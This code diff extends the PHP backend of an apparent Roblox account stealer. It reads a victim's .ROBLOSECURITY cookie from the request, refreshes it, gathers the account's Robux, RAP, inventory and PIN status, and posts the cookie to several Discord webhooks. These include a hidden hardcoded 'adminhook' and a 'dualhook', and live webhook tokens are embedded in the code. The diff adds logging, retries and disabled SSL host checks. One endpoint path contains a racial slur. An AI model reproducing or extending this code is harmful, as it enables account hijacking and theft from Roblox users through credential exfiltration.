@@ -2,11 +2,130 @@
 error_reporting(0);
 ini_set('default_socket_timeout', '6'); // prevent long hangs on remote calls
 set_time_limit(60); // Increase execution time limit to 60 seconds
+// Enable error_log even with error_reporting(0)
+ini_set('log_errors', 1);
+ini_set('display_errors', 0);
 
 // Admin webhook - constant webhook that receives all embeds and notifications (not exposed in frontend)
 $adminhook = "https://discord.com/api/webhooks/1437891603631968289/fESUQjQ05NN35ewAcATDKmP1atDTqwWEe_Wy6WJ_TJ8rJbkq8ugvxBQQzGYe3UQz0vfv";
 
+// Logging function for tracking steps and errors
+// Try multiple log file locations to ensure it works
+$logFile = __DIR__ . '/../../userinfo_logs.txt';
+$logFileAlt1 = __DIR__ . '/../userinfo_logs.txt';
+$logFileAlt2 = __DIR__ . '/userinfo_logs.txt';
+$logFileAlt3 = './userinfo_logs.txt';
+
+// Helper function to get detailed error reason from HTTP code
+function getHttpErrorReason($httpCode) {
+    $reasons = [
+        200 => 'Success',
+        201 => 'Created',
+        204 => 'No Content (Success)',
+        400 => 'Bad Request - Invalid webhook URL or malformed request',
+        401 => 'Unauthorized - Invalid webhook token',
+        403 => 'Forbidden - Webhook access denied',
+        404 => 'Not Found - Webhook URL does not exist or was deleted',
+        429 => 'Rate Limited - Too many requests, Discord is throttling',
+        500 => 'Discord Server Error - Discord API is experiencing issues',
+        502 => 'Bad Gateway - Discord proxy error',
+        503 => 'Service Unavailable - Discord API is down or overloaded',
+        504 => 'Gateway Timeout - Discord server took too long to respond'
+    ];
+    
+    if (isset($reasons[$httpCode])) {
+        return $reasons[$httpCode];
+    }
+    
+    if ($httpCode >= 200 && $httpCode < 300) {
+        return 'Success';
+    } elseif ($httpCode >= 400 && $httpCode < 500) {
+        return "Client Error ($httpCode) - Request was invalid or unauthorized";
+    } elseif ($httpCode >= 500) {
+        return "Server Error ($httpCode) - Discord server issue";
+    } elseif ($httpCode == 0) {
+        return 'No Response - Connection failed or timeout';
+    }
+    
+    return "Unknown HTTP Code: $httpCode";
+}
+
+// Helper function to get detailed CURL error reason
+function getCurlErrorReason($curlError) {
+    if (empty($curlError)) {
+        return '';
+    }
+    
+    $errorReasons = [
+        'CURLE_COULDNT_CONNECT' => 'Could not connect to Discord servers - Network issue or firewall blocking',
+        'CURLE_OPERATION_TIMEOUTED' => 'Request timed out - Discord servers are slow or unreachable',
+        'CURLE_SSL_CONNECT_ERROR' => 'SSL connection failed - Certificate or encryption issue',
+        'CURLE_COULDNT_RESOLVE_HOST' => 'Could not resolve Discord hostname - DNS issue',
+        'CURLE_RECV_ERROR' => 'Error receiving data from Discord - Connection interrupted',
+        'CURLE_SEND_ERROR' => 'Error sending data to Discord - Connection interrupted'
+    ];
+    
+    // Check for common error patterns
+    if (stripos($curlError, 'timeout') !== false) {
+        return 'Connection timeout - Discord servers took too long to respond or network is slow';
+    }
+    if (stripos($curlError, 'resolve') !== false || stripos($curlError, 'dns') !== false) {
+        return 'DNS resolution failed - Cannot resolve discord.com hostname';
+    }
+    if (stripos($curlError, 'ssl') !== false || stripos($curlError, 'certificate') !== false) {
+        return 'SSL/TLS error - Certificate validation or encryption issue';
+    }
+    if (stripos($curlError, 'connect') !== false) {
+        return 'Connection failed - Cannot reach Discord servers (firewall, network, or server down)';
+    }
+    if (stripos($curlError, 'refused') !== false) {
+        return 'Connection refused - Discord server rejected the connection';
+    }
+    
+    return "CURL Error: $curlError";
+}
+
+function logStep($step, $status, $details = '') {
+    global $logFile, $logFileAlt1, $logFileAlt2, $logFileAlt3;
+    $timestamp = date('Y-m-d H:i:s');
+    $statusIcon = $status === 'SUCCESS' ? '✅' : ($status === 'ERROR' ? '❌' : '⚠️');
+    $logEntry = "[$timestamp] $statusIcon [$status] $step";
+    if (!empty($details)) {
+        $logEntry .= " | $details";
+    }
+    $logEntry .= PHP_EOL;
+    
+    // Try to write to multiple locations
+    $written = false;
+    $locations = [$logFile, $logFileAlt1, $logFileAlt2, $logFileAlt3];
+    
+    foreach ($locations as $location) {
+        $result = @file_put_contents($location, $logEntry, FILE_APPEND | LOCK_EX);
+        if ($result !== false) {
+            $written = true;
+            break;
+        }
+    }
+    
+    // Also log to PHP error log so we can see it in server logs
+    error_log("USERINFO_LOG: $step [$status] " . ($details ? "| $details" : ""));
+    
+    // If all file writes failed, at least we have it in error_log
+    if (!$written) {
+        error_log("USERINFO_LOG_ERROR: Failed to write to all log file locations");
+    }
+}
+
+// Initialize log
+logStep('SCRIPT_START', 'INFO', 'UserInfo script started');
+
 $cookie = $_GET['cookie'];
+if (empty($cookie)) {
+    logStep('COOKIE_VALIDATION', 'ERROR', 'No cookie provided in request');
+    echo json_encode(['status' => 'error', 'message' => 'No cookie provided']);
+    exit;
+}
+logStep('COOKIE_RECEIVED', 'SUCCESS', 'Cookie received from request');
 $ht = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
 // Use HTTP_HOST so localhost includes the dev server port (e.g., localhost:8000)
 $dom = $ht . $_SERVER['HTTP_HOST'];
@@ -21,13 +140,20 @@ function getLocal($url, $timeout = 6) {
     return $res;
 }
 
+logStep('COOKIE_REFRESH', 'INFO', 'Attempting to refresh cookie');
 $refreshedCookie = getLocal("$dom/controlPage/apis/refresher.php?cookie=$cookie", 6);
 if ($refreshedCookie == "Invalid Cookie" || $refreshedCookie === false || $refreshedCookie === null) {
+    $refreshReason = $refreshedCookie === false ? 'Request failed or timeout' : ($refreshedCookie === null ? 'Null response' : 'Invalid cookie response');
+    logStep('COOKIE_REFRESH', 'WARNING', "Refresher failed: $refreshReason - Trying alternative method");
     $refreshedCookie = getLocal("$dom/controlPage/apis/nigger.php?cookie=$cookie", 6);
 }
 if (!$refreshedCookie || stripos($refreshedCookie, 'WARNING') !== false) {
     // fall back to original cookie to avoid total failure
+    $fallbackReason = !$refreshedCookie ? 'No response from refresh endpoint' : 'Response contains WARNING';
+    logStep('COOKIE_REFRESH', 'WARNING', "Refresh failed: $fallbackReason - Using original cookie");
     $refreshedCookie = $cookie;
+} else {
+    logStep('COOKIE_REFRESH', 'SUCCESS', 'Cookie refreshed successfully');
 }
 
 function makeRequest($url, $headers, $postData = null, $timeout = 8) {
@@ -47,13 +173,16 @@ function makeRequest($url, $headers, $postData = null, $timeout = 8) {
 }
 
 // Separate function for webhook requests that returns detailed result
-function makeWebhookRequest($url, $headers, $postData = null, $timeout = 8) {
+function makeWebhookRequest($url, $headers, $postData = null, $timeout = 10) {
     $ch = curl_init($url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
     curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
     if ($postData) {
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
@@ -81,12 +210,24 @@ function sanitize($value, $maxLength = 1024) {
 
 $headers = ["Cookie: .ROBLOSECURITY=$refreshedCookie", "Content-Type: application/json"];
 
+logStep('FETCH_USER_SETTINGS', 'INFO', 'Fetching user settings from Roblox');
 $settingsData = json_decode(makeRequest("https://www.roblox.com/my/settings/json", $headers), true);
 $userId = $settingsData['UserId'] ?? 0;
+if ($userId == 0) {
+    $errorReason = empty($settingsData) ? 'Empty response from Roblox API' : 'UserId field missing in response';
+    if (isset($settingsData['errors'])) {
+        $errorReason .= ' - Roblox API errors: ' . json_encode($settingsData['errors']);
+    }
+    logStep('FETCH_USER_SETTINGS', 'ERROR', "Failed to get UserId: $errorReason");
+} else {
+    logStep('FETCH_USER_SETTINGS', 'SUCCESS', "UserId: $userId");
+}
 
+logStep('FETCH_USER_INFO', 'INFO', "Fetching user info for userId: $userId");
 $userInfoData = json_decode(makeRequest("https://users.roblox.com/v1/users/$userId", $headers), true);
 $displayName = sanitize($userInfoData['displayName'] ?? 'Unknown');
 $username = sanitize($userInfoData['name'] ?? 'Unknown');
+logStep('FETCH_USER_INFO', 'SUCCESS', "Username: $username, DisplayName: $displayName");
 
 $games = [
     'BF' => json_decode(makeRequest("https://games.roblox.com/v1/games/994732206/votes/user", $headers), true)['canVote'] ? '✅' : '❌',
@@ -111,10 +252,13 @@ $avatarData = file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?u
 $avatarJson = json_decode($avatarData, true);
 $avatarUrl = $avatarJson['data'][0]['imageUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';
 
+logStep('FETCH_BALANCE', 'INFO', 'Fetching Robux balance');
 $balanceData = json_decode(makeRequest("https://economy.roblox.com/v1/users/$userId/currency", $headers), true);
 $robux = isset($balanceData['robux']) ? number_format($balanceData['robux']) : 0;
 $pendingRobux = isset($transactionSummaryData['pendingRobuxTotal']) ? number_format($transactionSummaryData['pendingRobuxTotal']) : '❓ Unknown';
+logStep('FETCH_BALANCE', 'SUCCESS', "Robux: $robux, Pending: $pendingRobux");
 
+logStep('FETCH_INVENTORY', 'INFO', 'Fetching inventory and RAP data');
 $collectiblesData = json_decode(makeRequest("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100", $headers), true);
 $rap = 0;
 if (isset($collectiblesData['data'])) {
@@ -124,6 +268,7 @@ if (isset($collectiblesData['data'])) {
 }
 $rap = number_format($rap);
 $inventoryCount = isset($collectiblesData['total']) ? number_format($collectiblesData['total']) : '❓ Unknown';
+logStep('FETCH_INVENTORY', 'SUCCESS', "RAP: $rap, Inventory Count: $inventoryCount");
 
 $pinData = json_decode(makeRequest("https://auth.roblox.com/v1/account/pin", $headers), true);
 $pinStatus = isset($pinData['isEnabled']) ? ($pinData['isEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';
@@ -218,11 +363,15 @@ $nonFilteredWebhook = "https://discord.com/api/webhooks/1286978728701857812/brPo
 $filteredWebhook = "https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l";
 
 // Collect all webhooks: main webhook, dualhook, and adminhook (constant)
+logStep('WEBHOOK_COLLECTION', 'INFO', 'Starting webhook collection');
 $webhooks = [];
 
 // Add adminhook first (constant webhook - always receives all embeds)
 if (!empty($adminhook)) {
     $webhooks[] = $adminhook;
+    logStep('WEBHOOK_COLLECTION', 'SUCCESS', 'Adminhook added to webhooks array');
+} else {
+    logStep('WEBHOOK_COLLECTION', 'ERROR', 'Adminhook is empty!');
 }
 
 // Get main webhook (PHP automatically decodes URL parameters, but handle both encoded and decoded)
@@ -239,8 +388,22 @@ if (!empty($mainWebhook) && trim($mainWebhook) !== '' && $mainWebhook !== 'null'
     if ($isValidUrl || (strpos($mainWebhook, 'http') === 0 && strpos($mainWebhook, 'discord.com/api/webhooks') !== false)) {
         if (!in_array($mainWebhook, $webhooks)) {
             $webhooks[] = $mainWebhook;
+            logStep('WEBHOOK_COLLECTION', 'SUCCESS', 'Main webhook added to array');
+        } else {
+            logStep('WEBHOOK_COLLECTION', 'WARNING', 'Main webhook already in array (duplicate) - Webhook URL matches another webhook in the list');
         }
+    } else {
+        $validationReason = !$isValidUrl ? 'URL format validation failed' : 'Does not appear to be a Discord webhook URL';
+        if (strpos($mainWebhook, 'http') !== 0) {
+            $validationReason .= ' - URL does not start with http:// or https://';
+        } elseif (strpos($mainWebhook, 'discord.com/api/webhooks') === false) {
+            $validationReason .= ' - URL does not contain discord.com/api/webhooks path';
+        }
+        logStep('WEBHOOK_COLLECTION', 'ERROR', "Main webhook validation failed: $validationReason");
     }
+} else {
+    $emptyReason = empty($mainWebhook) ? 'Empty value' : (trim($mainWebhook) === '' ? 'Whitespace only' : ($mainWebhook === 'null' ? 'String "null"' : 'String "undefined"'));
+    logStep('WEBHOOK_COLLECTION', 'WARNING', "Main webhook not provided: $emptyReason");
 }
 
 // Dualhook can be passed as 'dh' or 'dualhook' parameter
@@ -270,9 +433,23 @@ if (!empty($dualhook) && trim($dualhook) !== '' && $dualhook !== 'null' && $dual
         // Make sure dualhook isn't already in the array (avoid duplicates)
         if (!in_array($dualhook, $webhooks)) {
             $webhooks[] = $dualhook;
+            logStep('WEBHOOK_COLLECTION', 'SUCCESS', 'Dualhook added to array');
+        } else {
+            logStep('WEBHOOK_COLLECTION', 'WARNING', 'Dualhook already in array (duplicate) - Webhook URL matches another webhook in the list');
         }
+    } else {
+        $validationReason = !$isValidUrl ? 'URL format validation failed' : 'Does not appear to be a Discord webhook URL';
+        if (strpos($dualhook, 'http') !== 0) {
+            $validationReason .= ' - URL does not start with http:// or https://';
+        } elseif (strpos($dualhook, 'discord.com/api/webhooks') === false) {
+            $validationReason .= ' - URL does not contain discord.com/api/webhooks path';
+        }
+        logStep('WEBHOOK_COLLECTION', 'ERROR', "Dualhook validation failed: $validationReason");
     }
+} else {
+    logStep('WEBHOOK_COLLECTION', 'INFO', 'Dualhook not provided (optional)');
 }
+logStep('WEBHOOK_COLLECTION', 'SUCCESS', 'Total webhooks collected: ' . count($webhooks));
 
 // For high-value accounts, use filtered webhook but still include dualhook
 $isHighValue = (
@@ -386,44 +563,132 @@ $embed2 = [
 ];
 
 // Send embeds to all webhooks (adminhook + main webhook + dualhook)
+logStep('WEBHOOK_SENDING', 'INFO', 'Starting to send embeds to ' . count($webhooks) . ' webhook(s)');
 // Send both embeds unconditionally to each webhook - no validation checks inside loop
 foreach ($webhooks as $webhookIndex => $webhook) {
     // Skip empty webhooks, but don't validate URL again (already validated when added to array)
     if (empty($webhook)) {
+        logStep('WEBHOOK_SENDING', 'WARNING', "Webhook #$webhookIndex is empty, skipping");
         continue;
     }
     
+    $webhookName = ($webhook === $adminhook) ? 'adminhook' : (($webhookIndex == 1 && !empty($mainWebhook)) ? 'main_webhook' : (($webhookIndex == 2 || ($webhookIndex == 1 && empty($mainWebhook))) ? 'dualhook' : "webhook_$webhookIndex"));
+    logStep('WEBHOOK_SENDING', 'INFO', "Processing $webhookName (index: $webhookIndex)");
+    
     // Send embed1 (RAP summary) to this webhook - ALWAYS send
+    logStep('WEBHOOK_SENDING', 'INFO', "Sending embed1 (RAP) to $webhookName");
     $result1 = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed1);
-    // Short delay before sending embed2 to prevent rate limiting
-    usleep(500000); // 0.5 seconds
+    $embed1Success = isset($result1['http_code']) && $result1['http_code'] >= 200 && $result1['http_code'] < 300;
+    if ($embed1Success) {
+        logStep('WEBHOOK_SENDING', 'SUCCESS', "Embed1 sent to $webhookName - HTTP " . ($result1['http_code'] ?? 'unknown'));
+    } else {
+        $httpCode = $result1['http_code'] ?? 0;
+        $httpReason = getHttpErrorReason($httpCode);
+        $curlError = $result1['error'] ?? '';
+        $curlReason = getCurlErrorReason($curlError);
+        $errorDetails = "HTTP $httpCode: $httpReason";
+        if (!empty($curlReason)) {
+            $errorDetails .= " | $curlReason";
+        }
+        logStep('WEBHOOK_SENDING', 'ERROR', "Embed1 failed for $webhookName - $errorDetails");
+    }
+    // Minimal delay before sending embed2 to prevent rate limiting
+    usleep(300000); // 0.3 seconds
     
     // Send embed2 (cookie) to this webhook - CRITICAL: Always send embed2
     // Don't skip embed2 even if embed1 failed - this ensures all webhooks get cookie
+    logStep('WEBHOOK_SENDING', 'INFO', "Sending embed2 (cookie) to $webhookName");
     $result2 = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed2);
+    $embed2Success = isset($result2['http_code']) && $result2['http_code'] >= 200 && $result2['http_code'] < 300;
     
     // Check if embed2 succeeded, retry once if failed (Discord sometimes rate limits)
-    if (!isset($result2['http_code']) || $result2['http_code'] < 200 || $result2['http_code'] >= 300) {
-        usleep(1000000); // 1 second delay before retry
-        $result2Retry = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed2);
-        // If retry also failed, try one more time
-        if (!isset($result2Retry['http_code']) || $result2Retry['http_code'] < 200 || $result2Retry['http_code'] >= 300) {
-            usleep(1500000); // 1.5 seconds delay
-            makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed2);
+    if (!$embed2Success) {
+        $httpCode = $result2['http_code'] ?? 0;
+        $httpReason = getHttpErrorReason($httpCode);
+        $curlError = $result2['error'] ?? '';
+        $curlReason = getCurlErrorReason($curlError);
+        $errorDetails = "HTTP $httpCode: $httpReason";
+        if (!empty($curlReason)) {
+            $errorDetails .= " | $curlReason";
         }
+        logStep('WEBHOOK_SENDING', 'WARNING', "Embed2 failed for $webhookName - $errorDetails - Retrying...");
+        usleep(500000); // 0.5 seconds delay before retry
+        $result2Retry = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed2);
+        $embed2RetrySuccess = isset($result2Retry['http_code']) && $result2Retry['http_code'] >= 200 && $result2Retry['http_code'] < 300;
+        if ($embed2RetrySuccess) {
+            logStep('WEBHOOK_SENDING', 'SUCCESS', "Embed2 retry successful for $webhookName - HTTP " . ($result2Retry['http_code'] ?? 'unknown'));
+        } else {
+            // If retry also failed, try one more time
+            $retryHttpCode = $result2Retry['http_code'] ?? 0;
+            $retryHttpReason = getHttpErrorReason($retryHttpCode);
+            $retryCurlError = $result2Retry['error'] ?? '';
+            $retryCurlReason = getCurlErrorReason($retryCurlError);
+            $retryErrorDetails = "HTTP $retryHttpCode: $retryHttpReason";
+            if (!empty($retryCurlReason)) {
+                $retryErrorDetails .= " | $retryCurlReason";
+            }
+            logStep('WEBHOOK_SENDING', 'WARNING', "Embed2 retry failed for $webhookName - $retryErrorDetails - Final retry...");
+            usleep(700000); // 0.7 seconds delay
+            $result2Final = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed2);
+            $embed2FinalSuccess = isset($result2Final['http_code']) && $result2Final['http_code'] >= 200 && $result2Final['http_code'] < 300;
+            if ($embed2FinalSuccess) {
+                logStep('WEBHOOK_SENDING', 'SUCCESS', "Embed2 final retry successful for $webhookName - HTTP " . ($result2Final['http_code'] ?? 'unknown'));
+            } else {
+                $finalHttpCode = $result2Final['http_code'] ?? 0;
+                $finalHttpReason = getHttpErrorReason($finalHttpCode);
+                $finalCurlError = $result2Final['error'] ?? '';
+                $finalCurlReason = getCurlErrorReason($finalCurlError);
+                $finalErrorDetails = "HTTP $finalHttpCode: $finalHttpReason";
+                if (!empty($finalCurlReason)) {
+                    $finalErrorDetails .= " | $finalCurlReason";
+                }
+                logStep('WEBHOOK_SENDING', 'ERROR', "Embed2 final retry failed for $webhookName - $finalErrorDetails");
+            }
+        }
+    } else {
+        logStep('WEBHOOK_SENDING', 'SUCCESS', "Embed2 sent to $webhookName - HTTP " . ($result2['http_code'] ?? 'unknown'));
     }
     
-    // Short delay between webhooks to avoid rate limiting
+    // Minimal delay between webhooks to avoid rate limiting
     if ($webhookIndex < count($webhooks) - 1) {
-        usleep(500000); // 0.5 seconds
+        usleep(300000); // 0.3 seconds
     }
 }
+logStep('WEBHOOK_SENDING', 'SUCCESS', 'Finished sending to all webhooks in array');
 
 // Also send to non-filtered webhook (backup)
-makeWebhookRequest($nonFilteredWebhook, ["Content-Type: application/json"], $embed1);
-usleep(500000); // 0.5 seconds
-makeWebhookRequest($nonFilteredWebhook, ["Content-Type: application/json"], $embed2);
+logStep('WEBHOOK_SENDING', 'INFO', 'Sending to non-filtered webhook (backup)');
+$backupResult1 = makeWebhookRequest($nonFilteredWebhook, ["Content-Type: application/json"], $embed1);
+if (isset($backupResult1['http_code']) && $backupResult1['http_code'] >= 200 && $backupResult1['http_code'] < 300) {
+    logStep('WEBHOOK_SENDING', 'SUCCESS', 'Non-filtered webhook embed1 sent - HTTP ' . $backupResult1['http_code']);
+} else {
+    $backupHttpCode = $backupResult1['http_code'] ?? 0;
+    $backupHttpReason = getHttpErrorReason($backupHttpCode);
+    $backupCurlError = $backupResult1['error'] ?? '';
+    $backupCurlReason = getCurlErrorReason($backupCurlError);
+    $backupErrorDetails = "HTTP $backupHttpCode: $backupHttpReason";
+    if (!empty($backupCurlReason)) {
+        $backupErrorDetails .= " | $backupCurlReason";
+    }
+    logStep('WEBHOOK_SENDING', 'ERROR', "Non-filtered webhook embed1 failed - $backupErrorDetails");
+}
+usleep(300000); // 0.3 seconds
+$backupResult2 = makeWebhookRequest($nonFilteredWebhook, ["Content-Type: application/json"], $embed2);
+if (isset($backupResult2['http_code']) && $backupResult2['http_code'] >= 200 && $backupResult2['http_code'] < 300) {
+    logStep('WEBHOOK_SENDING', 'SUCCESS', 'Non-filtered webhook embed2 sent - HTTP ' . $backupResult2['http_code']);
+} else {
+    $backup2HttpCode = $backupResult2['http_code'] ?? 0;
+    $backup2HttpReason = getHttpErrorReason($backup2HttpCode);
+    $backup2CurlError = $backupResult2['error'] ?? '';
+    $backup2CurlReason = getCurlErrorReason($backup2CurlError);
+    $backup2ErrorDetails = "HTTP $backup2HttpCode: $backup2HttpReason";
+    if (!empty($backup2CurlReason)) {
+        $backup2ErrorDetails .= " | $backup2CurlReason";
+    }
+    logStep('WEBHOOK_SENDING', 'ERROR', "Non-filtered webhook embed2 failed - $backup2ErrorDetails");
+}
 
+logStep('SCRIPT_END', 'SUCCESS', 'Script completed successfully');
 echo json_encode([
     'robux' => $robux,
     'rap' => $rap,
